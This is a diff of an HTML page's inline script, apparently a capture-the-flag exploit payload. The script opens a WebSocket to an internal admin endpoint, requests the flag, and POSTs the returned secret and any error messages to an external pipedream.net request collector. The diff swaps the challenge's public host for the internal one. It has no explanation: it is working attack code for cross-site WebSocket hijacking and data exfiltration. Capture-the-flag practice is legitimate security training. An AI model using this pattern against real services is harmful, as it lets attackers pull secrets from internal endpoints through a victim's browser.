@@ -14,41 +14,37 @@
         });
 
         // WebSocket connection to retrieve flag
-        const ws = new WebSocket('http://ce441-web.spchallenge.ir:8080/ws');
-        
-        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: "After creating WS" })
-        });
-        
-        ws.onopen = () => {
-            ws.send('flag');  // Request the flag
-        };
+        const ws = new WebSocket('ws://web:8080/admin/ws');
 
-        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: "After sending flag re" })
-        });
+   ws.onerror = (event) => {
+     console.error('WebSocket error:', event);
 
-        ws.onmessage = (event) => {
-            const flag = event.data;
-            console.log("Flag:", flag);
+     // Send the error to RequestBin
+     fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify({ error: event.message })
+     });
+   };
 
-            // Send the flag back to RequestBin
-            fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ flag: flag })
-            });
+   ws.onopen = () => {
+     console.log('WebSocket connection established!');
+     ws.send('flag');
+   };
 
-            ws.close();
-        };
+   ws.onmessage = (event) => {
+     const flag = event.data;
+     console.log("Flag:", flag);
 
-        ws.onerror = (error) => {
-            console.error("WebSocket error:", error);
-        };
+     // Send the flag back to RequestBin
+     fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify({ flag: flag })
+     });
+
+     ws.close();
+   };
     </script>
 </body>
 </html>
